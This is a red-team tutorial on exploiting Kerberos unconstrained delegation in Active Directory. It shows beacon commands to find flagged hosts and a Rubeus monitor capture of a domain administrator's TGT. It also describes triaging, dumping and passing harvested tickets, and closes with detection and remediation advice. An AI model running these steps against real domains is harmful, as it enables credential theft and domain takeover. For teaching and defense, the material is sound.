---
title: "Exploiting Unconstrained Delegation"
date: 2026-09-25
weight: 2
type: docs
tags:
  - Kerberos
  - Unconstrained Delegation
  - Active Directory
---

## Unconstrained Delegation

Delegation in Kerberos is the mechanism that lets one principal act against a resource in the name of another. Picture the classic multi-tier application: a user signs in to a front-end web app with Kerberos, but the real work is carried out by some back-end service behind it, perhaps a SQL database or a file share. The moment the user triggers an action that the back end has to service, the web app faces a problem. It needs to authenticate to that back end as the user, not as itself.

Recall from the Kerberos fundamentals that a user first authenticates to the domain controller to collect a TGT, then spends that TGT to obtain service tickets. That model is exactly what makes the delegation problem awkward. The web server cannot simply walk up to the domain controller and ask for an MSSQLSvc ticket in the user's name, because it does not possess the user's secret. Delegation exists to bridge precisely that gap.

Modern Windows offers three flavours of delegation:

- Unconstrained delegation.
- Constrained delegation.
- Role-based constrained delegation (also known as resource-based constrained delegation).

Each deserves its own treatment, but this article is about the first of them. Unconstrained delegation was the original design, and it also turned out to be the most dangerous. It is switched on by setting the `TRUSTED_FOR_DELEGATION` flag in the `userAccountControl` attribute of a computer object.

You can enumerate every account carrying that flag with a single LDAP query. The bitwise matching rule below tests for the delegation bit directly:

```powershell
beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname

sAMAccountName: CONT-DC-1$
sAMAccountName: CONT-WEB-1$
```

Note that domain controllers always appear in this list, because they are configured for unconstrained delegation by design. That is not a finding worth flagging on its own, since holding local administrator rights on a domain controller already means the domain is lost regardless of delegation.

### How the trust actually works

The behaviour that makes unconstrained delegation dangerous is baked into the ticket exchange. When a client asks for a service ticket to an SPN that runs under one of these computer accounts (an HTTP service, say), the domain controller stamps a flag named `ok-as-delegate` into the TGS-REP. That flag is a signal to the client: the server named in this ticket is trusted for delegation. Acting on that signal, the client packages up not just the service ticket but a copy of its own TGT and sends both to the service inside the AP-REQ.

From there, the receiving computer caches the user's TGT in memory and can reuse it at will to request service tickets on that user's behalf, to any service it likes, for as long as the TGT remains valid. In other words, the front-end server is handed a fully reusable copy of the user's Kerberos identity.

The security consequence should be clear. If an attacker takes control of a machine configured for unconstrained delegation, every TGT that has been cached on it is up for grabs. Those TGTs can be pulled from memory and replayed to impersonate the associated users against any service in the domain. Where a privileged account has authenticated to the compromised host, the payoff can be immediate and total.

### Harvesting cached tickets

Rubeus provides a `monitor` command that watches for authentications and prints out the TGTs of users as they arrive, at a polling interval you control:

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap

[*] 19/02/2025 14:56:32 UTC - Found new TGT:

  User                  :  dyork@ARCADIA.LOCAL
  StartTime             :  19/02/2025 14:56:16
  EndTime               :  20/02/2025 00:56:16
  RenewTill             :  26/02/2025 14:56:16
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFj[...snip...]kNPTQ==
```

The capture above is significant: the harvested TGT belongs to *dyork*, a domain administrator. That single ticket is enough to act across the domain with administrative rights.

Because `monitor` runs as a background job, you close it out with the `jobs` and `jobkill` commands once you have what you need:

```powershell
beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 0    2468  .NET assembly

beacon> jobkill 0
[+] job 0 completed
```

### Turning a captured ticket into access

A base64-encoded TGT on its own is just data. To make use of it, you triage the sessions present on the host, extract the ticket you want, and then load it into a logon session you control so you can authenticate around the domain as that user.

The `krb_triage` command is a useful starting point. It lists the current logon sessions on the machine, including each session's LUID and the associated user, which tells you whose tickets are present and gives you the handle you need to target a specific session. With a LUID in hand, `krb_dump` will retrieve the corresponding ticket material for that session.

Once you have extracted a ticket, write it out to disk in the `.kirbi` format. That file can then be passed into a new logon session (for example with a pass-the-ticket technique) so that any subsequent domain authentication proceeds as the impersonated user. From that point on, you are operating with their identity and privileges.

## Detection and remediation

Unconstrained delegation is worth designing out rather than merely monitoring. Inventory every account with `TRUSTED_FOR_DELEGATION` set and confirm that each one genuinely requires it; in most estates the honest answer is that it does not, and the account can be migrated to constrained or resource-based delegation, which confine the trust to named services. For accounts that must remain sensitive, mark privileged users as *Account is sensitive and cannot be delegated* (or add them to the Protected Users group), which prevents their TGTs from being forwarded to and cached by a delegating host in the first place. Alongside that, treat any host configured for unconstrained delegation as a high-value target: restrict who can authenticate to it, watch for unexpected execution of ticket-harvesting tooling, and review who holds administrative rights over the object.

## Further reading

- [Microsoft Learn: Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Microsoft Learn: UserAccountControl flags](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties)
- [GhostPack Rubeus documentation](https://github.com/GhostPack/Rubeus)